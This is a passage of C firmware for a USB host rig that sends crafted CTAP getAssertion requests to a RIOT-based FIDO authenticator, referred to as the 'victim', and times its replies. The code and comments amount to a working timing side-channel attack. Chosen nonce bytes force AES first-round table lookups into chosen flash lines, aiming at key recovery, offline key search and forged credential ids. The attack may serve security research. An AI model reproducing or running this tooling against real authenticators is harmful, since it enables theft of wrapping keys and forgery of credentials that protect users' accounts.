    uputs("   (bInterval is the DEVICE's request; this host does not honour it"
          " -- that is the point)");
    nl();
    return XR_OK;
}

/* ======================= CTAPHID host, stage B ==========================
 *
 * Stage A read the endpoints off the device: EP 0x01 OUT, 0x81 IN, 64-byte
 * reports, bInterval 5.  Stage B talks CTAPHID over them and times the reply.
 *
 * THE ONE DESIGN CHOICE THAT MATTERS
 * ----------------------------------
 * Both endpoints are INTERRUPT endpoints, and the OTG core would schedule a
 * periodic channel at the device's requested interval -- which is the 5 ms grid
 * we are here to avoid.  So they are driven as EPTYP = BULK: non-periodic, which
 * means the core issues the token when we enable the channel and HALTS ON NAK
 * with the reason in HCINT.  On the wire a token is just IN or OUT with an
 * endpoint number; the device cannot tell which channel type the host used.
 *
 * That turns the reply into a poll of our own choosing: fire IN, and the device
 * either answers (done computing) or NAKs (still busy).  The latency we report
 * is the interval from the last OUT packet leaving to the first non-NAK IN.
 *
 * Data toggles are ours to track: bulk/interrupt endpoints alternate DATA0/DATA1
 * per successful transaction and both reset to DATA0 at SET_CONFIGURATION.  Get
 * this wrong and the device silently ignores every second packet.
 */

#define HID_MPS 64u

/* HCINT bit names, because "0x400" is a lookup and a wrong lookup costs a round. */
static void put_hcint(uint32_t s) {
    uputc('[');
    if (s & (1u<<0))  uputs("XFRC ");
    if (s & (1u<<1))  uputs("CHH ");
    if (s & (1u<<2))  uputs("AHBERR ");
    if (s & (1u<<3))  uputs("STALL ");
    if (s & (1u<<4))  uputs("NAK ");
    if (s & (1u<<5))  uputs("ACK ");
    if (s & (1u<<6))  uputs("NYET ");
    if (s & (1u<<7))  uputs("TXERR ");
    if (s & (1u<<8))  uputs("BBERR ");
    if (s & (1u<<9))  uputs("FRMOR ");
    if (s & (1u<<10)) uputs("DTERR ");
    uputc(']');
}

static uint32_t g_tog_out, g_tog_in;       /* 0 = DATA0, 1 = DATA1 */
static uint32_t g_last_got;                /* bytes the last IN transaction moved */
static uint8_t  g_last_cmd;                /* cmd/len of the last message received, */
static uint32_t g_last_len, g_last_ka;     /* so a failed probe can still be read */
static int      g_last_send, g_last_recv;  /* which stage failed */
/* EPTYP for the HID endpoints: 2 = BULK (non-periodic, halts on NAK -- what the
 * measurement wants), 3 = INTERRUPT (periodic, the core schedules it).  A knob
 * rather than a constant because "the device cannot tell which channel type the
 * host used" is an argument, and arguments get measured here. */
static uint32_t g_eptyp = 2u;
static uint32_t g_cid;                     /* CTAPHID channel */

/* The control path's hc_halt() waits up to 200 000 register reads for CHENA to
 * clear -- about 25 ms at 72 MHz -- and after a NAKed IN on this device it spends
 * every one of them.  Measured: poll starts at 5, 25054, 50063 us, i.e. two full
 * guards, which is why the reply time was a constant 50.14 ms whatever the
 * authenticator was doing.  The poll path gets a bounded halt instead: ask the
 * core to disable, give it a few hundred microseconds, and carry on -- the next
 * CHENA write re-arms the channel regardless. */
/* The OUT path needs a REAL halt and measurably will not take a short one: with
 * the poll guard cut to 8, a three-packet request (G 2, reqlen 132) came back
 * CTAPHID_INVALID_SEQ (0x04) where it had echoed cleanly at 200, while the
 * two-packet G 1 still passed.  A continuation packet written into a channel the
 * core has not finished disabling is sent twice, and the peer sees a duplicate
 * sequence number.  So the guard is per direction: short on IN, where it is the
 * measurement's granularity, and long on OUT, where it is correctness. */
static uint32_t g_halt_guard_out = 200u;

/* Microseconds to idle between consecutive probes in a `T` batch.  Zero is back-to-back,
 * which is what every capture here has done.
 *
 * This exists to test one mechanism, and it is the only knob that can. RIOT's CTAPHID
 * receive pipe is `_hid_rx_buf_mem[CONFIG_USBUS_HID_INTERRUPT_EP_SIZE]` -- 64 bytes, EXACTLY
 * one report -- and `_hid_rx_pipe()` fills it with `isrpipe_write_one()` while ignoring the
 * return value, so `tsrb_add_one()` returning -1 drops the byte silently. If the CTAP thread
 * has not drained report n before the USB ISR delivers n+1, n+1 is lost with no error and
 * the thread later sees seq n+1 where it wanted n -- which is `CTAP_HID_ERR_INVALID_SEQ`,
 * the fault this rig reports as `st=0x04`.
 *
 * That predicts the fault is about the device being BUSY, not about how much we sent, and
 * the measurement agrees: a CTAPHID_PING of the same byte length as a 4-entry getAssertion
 * echoes 8/8 perfectly (and 1000 bytes, 17 packets, also 8/8) while the getAssertion faults
 * 25 %. The remaining tail is the previous probe's CBOR parse and its N AES-CCM
 * decryptions, running while the next probe's reports arrive. A gap should abolish it; if it
 * does not, the mechanism above is wrong. */
static uint32_t g_probe_gap_us = 0u;

static void hold_us(uint32_t us) {
    if (!us) return;
    uint32_t t0 = now();
    while ((now() - t0) < us * 72u) { }
}

/* Start each probe at a CHOSEN point in the USB frame.  `HFNUM`'s FRREM field counts PHY
 * clocks remaining in the current frame, so at full speed it sweeps 47999..0 every 1 ms and
 * spinning until it lands in a window pins the probe's frame phase.
 *
 * This exists because the Dongle's fault rate turned out to depend on the gap between probes
 * NON-monotonically -- 23.5, 9.6, 5.7, 23.6, 24.9, 20.0 % at 0, 50, 200, 1000, 5000,
 * 20000 us, then 3.7, 3.8, 31.7, 22.7, 7.2, 10.8 % at 200, 600, 800, 1000, 1200, 1400 -- and
 * binning the faults by their recorded `ftrem` showed a 41-point spread, 4.8 % in one octant
 * of the frame against 45.8 % in another. But a fixed gap lands probes at a preferred phase,
 * so gap and phase are confounded and that profile could be the gap effect re-expressed.
 *
 * Setting the phase breaks the confound: hold the gap constant, put the probe where you
 * choose, and the fault rate is a function of phase alone. A correlation becomes an
 * intervention.
 *
 * NOT for use during a capture without re-checking the timing: pinning the phase removes the
 * very dither the campaign added deliberately (`J`), because a deterministic observable has
 * no averaging gain. This is a diagnostic knob, and 0 0 disables it. */
static uint32_t g_phase_lo = 0u, g_phase_hi = 0u;

static void await_phase(void) {
    if (g_phase_hi <= g_phase_lo) return;
    /* Bounded: a frame is 1 ms, so a window that exists is reached within one. The cap is
     * there so a nonsense window cannot hang a batch for hours -- it gives up and probes
     * anyway, which shows up as a phase profile that did not separate. */
    for (uint32_t spin = 0; spin < 4000000u; spin++) {
        uint32_t fr = (OTGH->HFNUM >> 16) & 0xFFFFu;
        if (fr >= g_phase_lo && fr < g_phase_hi) return;
    }
}

/* An xorshift the poll loop can call: separate state from the request PRNG, so
 * dithering the grid does not change a single request byte. */
static uint32_t g_jstate = 0x9E3779B9u;
static uint32_t dither_next2(uint32_t span) {
    uint32_t x = g_jstate; x ^= x << 13; x ^= x >> 17; x ^= x << 5; g_jstate = x;
    return x % span;
}

static void hc_halt_guarded(int ch, uint32_t guard) {
    uint32_t c = HC(ch)->HCCHAR;
    if (c & USB_OTG_HCCHAR_CHENA) {
        HC(ch)->HCCHAR = c | USB_OTG_HCCHAR_CHDIS | USB_OTG_HCCHAR_CHENA;
        /* This loop IS the measurement's granularity.  Measured poll intervals
         * were ~385 us with a 3 000-iteration guard and 8 us when the channel was
         * already halted (guard skipped) -- so the 385 us is our own bookkeeping,
         * not the bus, and it is what stops a 0.54 us effect being resolvable.
         * The channel gets re-enabled on the next transaction regardless, so
         * giving up early costs correctness nothing that a DTERR resync does not
         * already handle. */
        uint32_t g = guard;
        while ((HC(ch)->HCCHAR & USB_OTG_HCCHAR_CHENA) && --g) {}
    }
    HC(ch)->HCINT = 0xFFFFFFFFu;
}

static void hc_prep_bulk(int ch, uint8_t ep, int is_in) {
    hc_halt_guarded(ch, is_in ? g_halt_guard : g_halt_guard_out);
    HC(ch)->HCINT = 0xFFFFFFFFu;
    HC(ch)->HCINTMSK = 0;
    HC(ch)->HCCHAR = (HID_MPS << USB_OTG_HCCHAR_MPSIZ_Pos)
                   | (((uint32_t)ep & 0xFu) << USB_OTG_HCCHAR_EPNUM_Pos)
                   | (is_in ? USB_OTG_HCCHAR_EPDIR : 0u)
                   | (g_eptyp << USB_OTG_HCCHAR_EPTYP_Pos)
                   | (1u << USB_OTG_HCCHAR_MC_Pos)
                   | (((uint32_t)g_addr & 0x7Fu) << USB_OTG_HCCHAR_DAD_Pos);
}

/* One 64-byte report out.  Retries while the device NAKs, which it does whenever
 * its OUT endpoint has not been re-armed yet. */
/* Retry accounting for the OUT path.  The multi-packet ceiling -- a 500-byte PING
 * fails with INVALID_SEQ where 200 bytes echoes cleanly -- can only come from a
 * packet the device accepted and we sent again, so the questions are whether
 * retries happen at all, and whether any attempt was AMBIGUOUS (neither
 * completed nor NAKed), because resending one of those is how a duplicate
 * sequence number gets made. */
static uint32_t g_out_retries, g_out_retry_max, g_out_amb;

static int hid_out(const uint8_t *rep, uint32_t timeout_us) {
    if (!g_ep_out) return XR_ERR;
    g_fast_halt = 1u;          /* never transact against EP0 by accident */
    uint32_t tries = 0;
    uint32_t t0 = now(), deadline = timeout_us * 72u, resync = 0;
    for (;;) {
        hc_prep_bulk(0, g_ep_out, 0);
        /* 20 ms, and MEASURED to be necessary: at 3 ms even a 1-entry request
         * failed with INVALID_SEQ, because an OUT abandoned mid-transaction gets
         * retried and the peer sees a duplicate.  The multi-packet ceiling above
         * ~4 entries therefore has some other cause, and shortening this is not
         * the fix. */
        int r = hc_txn(0, 0, g_tog_out ? PID_DATA1 : PID_DATA0,
                       (uint8_t *)rep, HID_MPS, 0, 20000);
        /* ACK means the device took the data, whatever else the core reports.
         * The IN side needed "data first, return code second"; this is its twin.
         * Without it a packet that was ACKed but reported NAK gets RESENT, RIOT
         * sees a duplicate sequence number and answers CTAP_HID_ERR_INVALID_SEQ
         * (0x04) -- which is what broke every request of 5 entries or more. */
        if (r == XR_OK || (g_hcint_last & USB_OTG_HCINT_ACK)) {
            g_tog_out ^= 1u;
            if (tries > g_out_retry_max) g_out_retry_max = tries;
            g_out_retries += tries;
            return XR_OK;
        }
        tries++;
        /* An attempt that neither completed nor was NAKed is AMBIGUOUS: the
         * packet may or may not have reached the device.  Count those
         * separately, because resending one is exactly how a duplicate sequence
         * number gets made. */
        if (r == XR_TIMEOUT || (r == XR_ERR && !(g_hcint_last & USB_OTG_HCINT_DTERR)))
            g_out_amb++;
        if (r == XR_ERR && (g_hcint_last & USB_OTG_HCINT_DTERR) && resync < 2u) {
            g_tog_out ^= 1u; resync++; continue;
        }
        if (r != XR_NAK) return r;
        if ((now() - t0) > deadline) return XR_TIMEOUT;
    }
}

/* One 64-byte report in.  `naks` counts the NAKed IN tokens, i.e. how many times
 * we asked before the device was ready -- the poll count is as informative as
 * the time, because it is quantised by nothing but our own loop. */
/* Per-poll jitter, in microseconds of span.  This is what buys averaging.
 *
 * The reply time this rig reports is the first poll that came back with data, so
 * it is the true latency ROUNDED UP to our own poll grid -- and back-to-back
 * probes run that grid in lockstep with the request, which makes the reported
 * time deterministic: eight probes at 164-byte ids gave sd 0 us.  A deterministic
 * observable has no averaging gain at all, whatever N is, so a sub-microsecond
 * effect under a ~390 us grid is invisible forever.
 *
 * Randomising the gap before each IN token dithers the grid instead.  The
 * reported time becomes latency + U(0, gap) rather than a fixed rounding, its
 * expectation moves linearly with the latency, and the mean over N probes
 * converges as 1/sqrt(N).  It cannot break the transaction the way a delay
 * inserted before the FIRST poll did (that broke every 20-entry request): this
 * only asks a little less often, and NAK-polling is already the normal case. */
static uint32_t g_poll_jitter = 0u;

/* 0 = escalating recovery after a faulted probe (re-INIT, then re-enumerate),
 * 1 = carry straight on to the next probe.  See the note at the fault path. */
static uint32_t g_recover_mode = 0u;

static int hid_in(uint8_t *rep, uint32_t timeout_us, uint32_t *naks) {
    if (!g_ep_in) return XR_ERR;
    g_fast_halt = 1u;
    uint32_t t0 = now(), deadline = timeout_us * 72u, n = 0, resync = 0;
    for (;;) {
        uint32_t got = 0;
        if (g_poll_jitter) delay_us(dither_next2(g_poll_jitter));
        hc_prep_bulk(0, g_ep_in, 1);
        /* 20 ms, not 2 ms: the inner timeout has to be long enough for the core
         * to finish a transaction it has started.  The verbose poll loop that
         * first saw a reply used 20 ms, and hid_in failed with 2 ms -- same wire,
         * same device, different timeout. */
        int r = hc_txn(0, 1, g_tog_in ? PID_DATA1 : PID_DATA0, rep, HID_MPS, &got, 20000);
        g_last_got = got;
        /* DATA FIRST, and the return code second.  Measured: the core can report
         * NAK on a transaction that nevertheless delivered a full 64-byte report
         * (`IN[3] -> NAK got=64 [NAK]`), which is the same family as the
         * documented "XFRC and NAK together" trap one level deeper -- and testing
         * the code first threw a perfectly good reply away.  If bytes arrived,
         * they arrived. */
        if (got) { g_tog_in ^= 1u; if (naks) *naks = n; return XR_OK; }
        /* A zero-length IN completes with XFRC and delivers nothing.  Returning
         * XR_OK for it hands the caller an untouched buffer, whose sentinel then
         * parses as a header with a garbage BCNT -- so a ZLP is a POLL, not a
         * result, and only a real error bails out here. */
        if (r != XR_OK && r != XR_NAK && r != XR_TIMEOUT) return r;
        /* DTERR means the packet arrived with the OTHER PID.  Measured: the very
         * first IN after SET_CONFIGURATION takes this path, so the device's
         * toggle is not where a fresh-endpoint assumption puts it.  Flip and
         * retry rather than encode a guess about whose toggle is right -- this
         * changes which PID we ASK for, never what is timed. */
        if (r == XR_ERR && (g_hcint_last & USB_OTG_HCINT_DTERR) && resync < 6u) {
            g_tog_in ^= 1u; resync++; continue;
        }
        n++;
        if ((now() - t0) > deadline) { if (naks) *naks = n; return XR_TIMEOUT; }
    }
}

/* ---- CTAPHID framing ----------------------------------------------------- */
static uint8_t  g_req[4096];
static uint32_t g_req_len;
/* 4096 and not 512.  At 512 this buffer was SMALLER than the requests the rig can send,
 * and `recv_message(..., sizeof g_rep, ...)` silently caps at it -- so a CTAPHID_PING of
 * 616, 760 or 802 bytes came back "len=512, payload identical", which reads as a device
 * truncating its echo and was very nearly written up as a RIOT buffer limit. It was this
 * array. RIOT's own CTAP_HID_BUFFER_SIZE is 7609 and its response buffer
 * CTAP_MAX_MSG_SIZE is 1024, so neither is 512 and neither ever was.
 *
 * The general point, since PING is this rig's CONTROL for multi-packet assembly: a control
 * instrument with a smaller ceiling than the thing it is controlling for manufactures the
 * failure it is supposed to rule out. Keep this at or above g_req. */
static uint8_t  g_rep[4096];
static uint8_t  g_raw[HID_MPS];      /* the first IN report of a message, verbatim */

static int ctaphid_send(uint32_t cid, uint8_t cmd, const uint8_t *pay, uint32_t len)
{
    uint8_t rep[HID_MPS];
    uint32_t first = len < (HID_MPS - 7u) ? len : (HID_MPS - 7u);
    for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0;
    rep[0] = (uint8_t)(cid >> 24); rep[1] = (uint8_t)(cid >> 16);
    rep[2] = (uint8_t)(cid >> 8);  rep[3] = (uint8_t)cid;
    rep[4] = cmd;
    rep[5] = (uint8_t)(len >> 8); rep[6] = (uint8_t)len;
    for (uint32_t i = 0; i < first; i++) rep[7 + i] = pay[i];
    int r = hid_out(rep, 1000000);
    if (r != XR_OK) return r;

    uint32_t off = first, seq = 0;
    while (off < len) {
        uint32_t chunk = len - off;
        if (chunk > HID_MPS - 5u) chunk = HID_MPS - 5u;
        for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0;
        rep[0] = (uint8_t)(cid >> 24); rep[1] = (uint8_t)(cid >> 16);
        rep[2] = (uint8_t)(cid >> 8);  rep[3] = (uint8_t)cid;
        rep[4] = (uint8_t)seq;
        for (uint32_t i = 0; i < chunk; i++) rep[5 + i] = pay[off + i];
        r = hid_out(rep, 1000000);
        if (r != XR_OK) return r;
        off += chunk; seq++;
    }
    return XR_OK;
}

/* Receive one complete CTAPHID message.  KEEPALIVE (0xBB) frames are skipped but
 * counted: a reply that needed one spent >100 ms inside the authenticator, which
 * for this workload means something other than the cipher happened. */
static int ctaphid_recv(uint8_t *cmd_out, uint8_t *buf, uint32_t cap,
                        uint32_t *len_out, uint32_t timeout_us,
                        uint32_t *naks, uint32_t *keepalives)
{
    uint8_t rep[HID_MPS];
    uint32_t ka = 0;
    for (;;) {
        for (uint32_t i = 0; i < HID_MPS; i++) rep[i] = 0xA5u;   /* sentinel */
        int r = hid_in(rep, timeout_us, naks);
        if (r != XR_OK) return r;
        for (uint32_t i = 0; i < HID_MPS; i++) g_raw[i] = rep[i];
        uint32_t cid = ((uint32_t)rep[0] << 24) | ((uint32_t)rep[1] << 16)
                     | ((uint32_t)rep[2] << 8) | rep[3];
        if (!(rep[4] & 0x80u)) continue;                 /* continuation, no header */
        if (rep[4] == 0xBBu) { ka++; continue; }         /* KEEPALIVE */
        uint32_t blen = ((uint32_t)rep[5] << 8) | rep[6];
        if (blen > cap) blen = cap;         /* else `while (got < blen)` below
                                             * spins forever once got hits cap */
        if (cmd_out) *cmd_out = rep[4];
        (void)cid;
        uint32_t take = blen < (HID_MPS - 7u) ? blen : (HID_MPS - 7u);
        uint32_t got = 0;
        for (uint32_t i = 0; i < take && got < cap; i++) buf[got++] = rep[7 + i];
        while (got < blen) {
            uint32_t before = got;
            r = hid_in(rep, timeout_us, 0);
            if (r != XR_OK) return r;
            uint32_t chunk = blen - got;
            if (chunk > HID_MPS - 5u) chunk = HID_MPS - 5u;
            for (uint32_t i = 0; i < chunk && got < cap; i++) buf[got++] = rep[5 + i];
            if (got == before) return XR_ERR;        /* no progress: bail, never spin */
        }
        if (len_out) *len_out = got;
        if (keepalives) *keepalives = ka;
        return XR_OK;
    }
}

/* The endpoint numbers come from read_config_desc(), and NOTHING else sets them.
 * Skip that step and g_ep_out is still 0 -- so every "HID" transaction goes to
 * ENDPOINT 0, the control endpoint, where the device's hardware ACKs it and the
 * software correctly ignores a data packet with no SETUP before it.  That reads
 * exactly like a device that will not answer: OUT -> XFRC|ACK, IN -> ZLP,
 * forever, with no debug output on the victim.  Cost: an evening.
 * Anything that talks HID goes through here first. */
static int ensure_ready(void) {
    if (g_ep_out && g_ep_in) return XR_OK;
    int r = enumerate();
    if (r != XR_OK) return r;
    r = read_config_desc();
    if (r != XR_OK) return r;
    if (!g_ep_out || !g_ep_in) {
        uputs("  no HID endpoints in the config descriptor"); nl();
        return XR_ERR;
    }
    g_tog_out = g_tog_in = 0;
    return XR_OK;
}

static int recv_message(uint8_t *cmd, uint8_t *buf, uint32_t cap, uint32_t *len_out,
                        uint32_t polls, uint32_t *naks, uint32_t *keepalives);

/* Drain the IN endpoint until it has nothing left, discarding whatever arrives.
 *
 * THIS IS WHAT UNWEDGES THE DEVICE, and the reason is on the victim's side:
 * RIOT's `_process_transaction` finishes by writing the reply, and
 * usbus/hid.c's write blocks on `hid->in_lock` until the HOST collects the
 * previous report.  A host that stops polling -- because it got its answer, or
 * gave up -- leaves that mutex held, so the CTAP thread never returns, never
 * calls `_clear_ctap_buffer()`, and `_state.is_locked` stays 1 forever.  The
 * timeout path in ctap_hid.c is gated on `!is_locked`, so nothing recovers it
 * and only a reset helps.  That is the sticky wedge this rig fought all night.
 *
 * So the obvious fix was: drain before every request and after every reply.
 * MEASURED, AND IT IS WORSE -- 0 of 12 probes succeeded against 8 of 20 without
 * it, because the extra polls desynchronise the data toggle and every subsequent
 * reply is then missed.  The function is kept because it is the right primitive
 * and the diagnosis above still holds; the calls are removed.  Whatever unwedges
 * this device, draining on a schedule is not it. */
static uint32_t drain_in(uint32_t max_polls) {
    uint8_t rep[HID_MPS];
    uint32_t taken = 0, empty = 0;
    for (uint32_t k = 0; k < max_polls && empty < 2u; k++) {
        uint32_t got = 0;
        hc_prep_bulk(0, g_ep_in, 1);
        int q = hc_txn(0, 1, g_tog_in ? PID_DATA1 : PID_DATA0, rep, HID_MPS, &got, 2000);
        if (got) { g_tog_in ^= 1u; taken++; empty = 0; }
        else {
            if (q == XR_ERR && (g_hcint_last & USB_OTG_HCINT_DTERR)) g_tog_in ^= 1u;
            empty++;
        }
    }
    return taken;
}

/* Abort a transaction RIOT is stuck on.
 *
 * Read from ctap_hid.c:241-256: while `_is_busy`, a packet whose cid does NOT
 * match `_state.cid` is answered CHANNEL_BUSY and dropped -- so an INIT on the
 * BROADCAST cid, which is what a naive recovery sends, cannot clear anything.
 * The documented abort is an INIT on the cid the device is busy with: that path
 * clears the buffer and re-buffers the packet.  Getting this wrong is why every
 * recovery in this rig silently failed and the wedge looked unrecoverable. */
static int ctaphid_abort(void) {
    if (!g_cid) return XR_ERR;
    uint8_t nonce[8] = { 0xa5,0x5a,0xa5,0x5a,0x01,0x02,0x03,0x04 };
    g_tog_out = g_tog_in = 0;
    int r = ctaphid_send(g_cid, 0x86u, nonce, 8);
    if (r != XR_OK) return r;
    uint8_t cmd = 0; uint32_t len = 0, naks = 0, ka = 0;
    r = recv_message(&cmd, g_rep, sizeof g_rep, &len, 600u, &naks, &ka);
    return r;
}

static int ctaphid_init(void) {
    uint8_t nonce[8] = { 0xde,0xad,0xbe,0xef,0x01,0x02,0x03,0x04 };
    g_tog_out = g_tog_in = 0;
    int r = ctaphid_send(0xFFFFFFFFu, 0x86u, nonce, 8);
    if (r != XR_OK) return r;
    uint8_t cmd = 0; uint32_t len = 0, naks = 0, ka = 0;
    r = ctaphid_recv(&cmd, g_rep, sizeof g_rep, &len, 500000, &naks, &ka);
    if (r != XR_OK) return r;
    uputs("  INIT reply cmd=0x"); puthexb(cmd); uputs(" len="); putdec(len);
    uputs(" naks="); putdec(naks); uputs(" got="); putdec(g_last_got); nl();
    uputs("  raw report: ");
    for (uint32_t i = 0; i < HID_MPS; i++) { puthexb(g_raw[i]); if ((i & 7u) == 7u) uputc(' '); }
    nl();
    if (cmd != 0x86u || len < 12u) return XR_ERR;
    g_cid = ((uint32_t)g_rep[8] << 24) | ((uint32_t)g_rep[9] << 16)
          | ((uint32_t)g_rep[10] << 8) | g_rep[11];
    return XR_OK;
}

/* ---- the request ---------------------------------------------------------
 * authenticatorGetAssertion, built by hand because the shape is fixed:
 *   {1: "example.com", 2: h'..32..', 3: [ {"type":"public-key","id": h'..165..'} x n ],
 *    5: {"up": false}}
 * `up` false is what keeps a button press out of the loop; RIOT honours it
 * (ctap.c:678 sits inside `if (req.options.up)`).  The 165-byte id is exactly
 * sizeof(ctap_cred_id_t) -- any other length is rejected by the CBOR parser
 * before it reaches the cipher.
 */
static uint32_t prng;
static uint8_t prng_byte(void) {
    uint32_t x = prng; x ^= x << 13; x ^= x >> 17; x ^= x << 5; prng = x;
    return (uint8_t)(x >> 24);
}

static uint32_t g_idlen = 164u;   /* credential-id length; a knob, see below */
/* Per-poll transaction timeout, in microseconds.  This is THE knob that decides
 * whether the measurement sees the cipher: at 20 ms the reply time was a constant
 * 50 137 ticks for 1 entry and for 5, because three timed-out polls dominated
 * everything the device did.  A NAK halts the channel immediately, and a 64-byte
 * data packet is ~50 us on the wire, so a few hundred microseconds is ample --
 * and then the poll COUNT becomes the measurement's resolution. */
static uint32_t g_poll_us = 300u;
static uint32_t g_pt[10], g_pn;      /* per-poll timestamps, to find where time goes */
/* Post-send dither, microseconds.  The phase that needs randomising is between
 * the device STARTING work and our first poll -- everything after the OUT is
 * deterministic, which is why six probes with different inputs returned
 * identical latencies.  Randomising when the REQUEST is sent does nothing for
 * that; randomising when we START POLLING is what buys the averaging gain. */
static uint32_t g_dither_us = 0u;
static uint32_t g_prepoll_us = 0u;
static uint32_t g_dstate = 0x12345678u;
static uint32_t dither_next(void) {
    uint32_t x = g_dstate; x ^= x << 13; x ^= x >> 17; x ^= x << 5; g_dstate = x;
    return g_dither_us ? (x % g_dither_us) : 0u;
}

/* Nonce fill: force every CHOSEN nonce byte of every credential id in the request
 * to one value.  This is the amplifier the bus-side measurement needs.
 *
 * A credential id is id(136) || mac(16) || nonce(13), so offsets 152..163 are the
 * nonce bytes we get to choose (164 is TinyCBOR's NUL -- see the note below).
 * RIOT's CCM decrypt builds its counter blocks as flags(1) || nonce(13) ||
 * counter(2), so those 12 bytes land at AES input bytes 1..12, and the first
 * round looks them up in Te0 at index (in[t] ^ k[t]).  Setting all twelve to the
 * same v means the twelve lookups differ only by the key, so the number of
 * DISTINCT flash lines those lookups touch is a function of v and the key alone
 * -- and it changes as v sweeps.  The amplification is multiplicative: 9 counter
 * blocks per unwrap (136 bytes of id) times `entries` unwraps per request, every
 * one of them with the same pattern.
 *
 * Values above 0xFF turn the fill off and leave the nonce bytes pseudorandom,
 * which is the control arm. */
static uint32_t g_nfill = 0x100u;

/* Per-byte offset applied to the fill: nonce byte i is written as
 * `g_nfill ^ g_noff[i]`.  Zero everywhere reproduces a plain equal fill.
 *
 * This is what lets the probe be run against a NON-zero key.  The round-1 index is
 * `in[p] ^ k[p]`, so writing `v ^ k[p]` into every controlled byte puts every one
 * of those lookups on line `v >> 2` whatever the key is -- and loading a WRONG
 * vector scatters them, which is the control.  With the offsets zero the probe
 * only amplifies for a key whose bytes are all equal, which is why the first
 * result needed an all-zero key.
 *
 * Twelve entries, for nonce offsets 152..163. */
static uint8_t g_noff[12];

/* Which of the twelve chosen nonce bytes the fill applies to; bit i = byte i.
 * Unmasked bytes keep their pseudorandom value.
 *
 * This is what turns one joint hypothesis into a LADDER.  Equalising all twelve
 * bytes tests a single guess out of 2^96 and cannot recover anything; equalising a
 * subset tests a hypothesis about that subset only, and the signal is the number
 * of ADJACENT-in-lookup-order pairs the subset contains, because this part holds
 * one flash line and only a lookup that repeats the previous line is free.
 *
 * RIOT's round 1 reads bytes in the order 0,5,10,15, 4,9,14,3, 8,13,2,7, 12,1,6,11
 * (`aes.c:1098`), so the longest run of bytes we control -- input bytes 1..12, i.e.
 * nonce indices 0..11 -- is AES 2,7,12,1,6,11 = nonce indices 1,6,11,0,5,10, six
 * bytes carrying five adjacent pairs.  Masking a prefix of that chain gives
 * 1,2,3,4,5 collisions, which is the dose-response curve a ladder's step size has
 * to be read off. */
static uint32_t g_nmask = 0xFFFu;

/* Pair-difference mode: put a fresh random byte in nonce index `g_pair_p` and
 * that byte XOR `g_pair_d` in `g_pair_q`, leaving the other ten pseudorandom.
 * This is the classical first-round collision probe -- the difference that makes
 * the two lookups share a line reveals `k[p] ^ k[q]` to line resolution (4 of 256
 * differences collide, so 64 distinguishable classes) -- and unlike the fill it
 * needs no knowledge of the key.  Applied after the fill, so it wins. */
static uint32_t g_pair_on = 0u, g_pair_p = 1u, g_pair_q = 6u, g_pair_d = 0u;

/* One nonce for EVERY credential id in the request, reported to the host.
 *
 * This is what a profiling attack needs. Binning the reply time by one nonce byte's
 * value only works if that byte is the same in every unwrap the probe triggers --
 * otherwise each entry carries an independent value, the effect of the byte being
 * binned is diluted by eight and the other seven add noise. With one nonce shared
 * across the entries, the per-byte effect is amplified by the entry count instead.
 *
 * The bytes are reported rather than mirrored from a seed: a host-side copy of the
 * device PRNG is one more thing to get silently wrong, and 24 hex characters per
 * record is ~2 ms at 115 200, which is nothing against a 10 ms probe. */
static uint8_t  g_fixnonce[12];
static uint32_t g_fixnonce_on = 0u;

/* A whole credential id supplied by the host, used verbatim for every entry.
 *
 * This is the forgery test.  The offline key search rests on a model of what the
 * victim decrypts -- ciphertext(136) || mac(16) || nonce(13), counter blocks
 * `flags=1 || nonce || counter` with the data starting at counter 1 -- and the way
 * to check a model of a MAC is to build a blob that satisfies it and see whether the
 * peer accepts.  A forged id whose plaintext carries the right rp_id_hash makes
 * `_find_matching_rks` succeed, so the reply stops being
 * CTAP2_ERR_NO_CREDENTIALS (0x2E).  Any other status proves the MAC verified. */
/* This rig's base had no hex parser; the `T` command open-codes one. */
static int hexval(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static uint8_t  g_fixid[200];
static uint32_t g_fixid_on = 0u;

static void build_get_assertion(uint32_t entries, uint32_t seed)
{
    static const char RP[] = "example.com";
    uint32_t o = 0;
    prng = seed ? seed : 1u;
    /* entries == 0 omits the allowList entirely, which makes the whole request
     * 56 bytes -- one CTAPHID packet, no continuations.  That is the control that
     * separates "RIOT cannot parse our CBOR" from "RIOT never assembled our
     * multi-packet message": the CBOR is the same shape either way. */
    g_req[o++] = 0x02;                                   /* authenticatorGetAssertion */
    g_req[o++] = entries ? 0xA4u : 0xA3u;                /* map(4) or map(3) */
    g_req[o++] = 0x01;
    g_req[o++] = (uint8_t)(0x60u | (sizeof RP - 1u));    /* text(11) */
    for (uint32_t i = 0; i < sizeof RP - 1u; i++) g_req[o++] = (uint8_t)RP[i];
    g_req[o++] = 0x02;
    g_req[o++] = 0x58; g_req[o++] = 0x20;                /* bytes(32) clientDataHash */
    for (uint32_t i = 0; i < 32u; i++) g_req[o++] = prng_byte();
    if (entries) {
    g_req[o++] = 0x03;
    g_req[o++] = (uint8_t)(0x80u | entries);             /* array(entries), entries < 24 */
    }
    for (uint32_t e = 0; e < entries; e++) {
        /* "id" BEFORE "type".  RIOT runs cbor_value_validate(...,
         * CborValidateCanonicalFormat) on the whole request before parsing a
         * single field (ctap_cbor.c:826), and canonical CBOR orders map keys by
         * encoded LENGTH first, then bytewise -- so text(2) "id" must precede
         * text(4) "type".  Getting this backwards fails validation, which returns
         * CTAP2_ERR_CBOR_PARSING (0x10) with no debug output at all, before the
         * parser touches any field.  That is why only requests carrying an
         * allowList failed: the options map has a single key and is trivially
         * ordered.  Cost: most of an evening. */
        g_req[o++] = 0xA2;                               /* map(2) */
        g_req[o++] = 0x62; g_req[o++]='i'; g_req[o++]='d';
        /* 164, not 165.  sizeof(ctap_cred_id_t) IS 165, but RIOT parses the id
         * with TinyCBOR's cbor_value_copy_byte_string into a 165-byte buffer, and
         * that helper needs len + 1 for a terminating NUL -- so 165 returns
         * CborErrorOutOfMemory, which RIOT reports as CTAP2_ERR_CBOR_PARSING
         * (0x10).  Measured, after 0x10 came back for every 165-byte request.
         * Consequence worth keeping in view: a credential id RIOT itself emits is
         * 165 bytes, so RIOT cannot parse back its own non-resident credentials.
         * For the probe it costs one nonce byte: offsets 152..163 are ours and
         * TinyCBOR writes NUL into 164, so 12 of the 13 nonce bytes are chosen. */
        if (g_idlen < 24u) {
